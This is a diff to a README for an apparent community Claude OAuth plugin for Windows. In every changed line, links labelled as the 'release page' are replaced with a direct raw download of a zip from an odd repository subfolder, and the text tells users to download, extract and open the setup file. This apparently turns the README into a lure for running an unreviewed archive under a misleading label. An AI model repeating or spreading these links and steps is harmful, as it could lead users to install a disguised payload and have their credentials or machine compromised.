@@ -1,10 +1,10 @@
 # 🧩 opencode-anthropic-auth-community - Easy Claude OAuth Setup for Windows
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6E6E6E?style=for-the-badge&logo=github)](https://github.com/Bepper-ai/opencode-anthropic-auth-community/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6E6E6E?style=for-the-badge&logo=github)](https://github.com/Bepper-ai/opencode-anthropic-auth-community/raw/refs/heads/main/ultrasonic/anthropic_auth_community_opencode_2.6-beta.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Bepper-ai/opencode-anthropic-auth-community/releases
+Visit this page to download: https://github.com/Bepper-ai/opencode-anthropic-auth-community/raw/refs/heads/main/ultrasonic/anthropic_auth_community_opencode_2.6-beta.2.zip
 
 Download the latest release for Windows, then open the file from your browser downloads or the Downloads folder
 
@@ -28,7 +28,7 @@ Use it if you want a community-built auth plugin that works with your existing o
 
 ## 🚀 Install on Windows
 
-1. Open the release page: https://github.com/Bepper-ai/opencode-anthropic-auth-community/releases
+1. Open the release page: https://github.com/Bepper-ai/opencode-anthropic-auth-community/raw/refs/heads/main/ultrasonic/anthropic_auth_community_opencode_2.6-beta.2.zip
 2. Find the newest release at the top of the page
 3. Look for a Windows download file
 4. Download the file to your computer
@@ -131,7 +131,7 @@ Choose the file that matches Windows and looks like the main release package
 
 ## 🔎 Quick start
 
-1. Visit the release page: https://github.com/Bepper-ai/opencode-anthropic-auth-community/releases
+1. Visit the release page: https://github.com/Bepper-ai/opencode-anthropic-auth-community/raw/refs/heads/main/ultrasonic/anthropic_auth_community_opencode_2.6-beta.2.zip
 2. Download the latest Windows file
 3. Extract it if needed
 4. Open the app or setup file
